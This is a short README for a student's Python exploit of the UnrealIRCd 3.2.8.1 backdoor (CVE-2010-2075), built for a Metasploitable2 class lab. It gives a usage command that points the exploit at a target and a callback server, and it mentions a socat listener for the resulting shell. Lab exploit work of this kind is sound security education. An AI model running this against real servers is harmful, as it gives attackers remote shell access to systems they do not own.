## Info
This is just an initial effort at writing a tool for a class. This is a python implementation of exploitation of
the unrealIRCd 3.2.8.1 backdoor (CVE-2010-2075). I'm still working on the implementation of classes and inits and all
that good stuff so don't expect the world here. My intent is to make this into a modular exploitation framework at some point.
Feel free to use this and play around and make it your own for whatever you'd like.

This was made to run against a specific metasploitable2 target system for school, so things are set up to work on
those files accordingly. I suggest just running through and making changeable variables for inputs...I'll be making that
change eventually (or at least I plan to).

I included the cert (test.pem) for the SSL comms, but of course feel free to make your own upgrades.

## Usage
This is super simple and only takes a couple arguments.
`python3 exploit.py -t <target ip> -p <target port> -s <callback server socket address>`
i.e.
`python3 exploit.py -t 10.10.10.10 -p 6667 -s 10.10.10.20:9090`

The listener is in the `socatch.sh` script for ease of use.
Just make it executable, run it, and boom! Robert's your mother's brother.
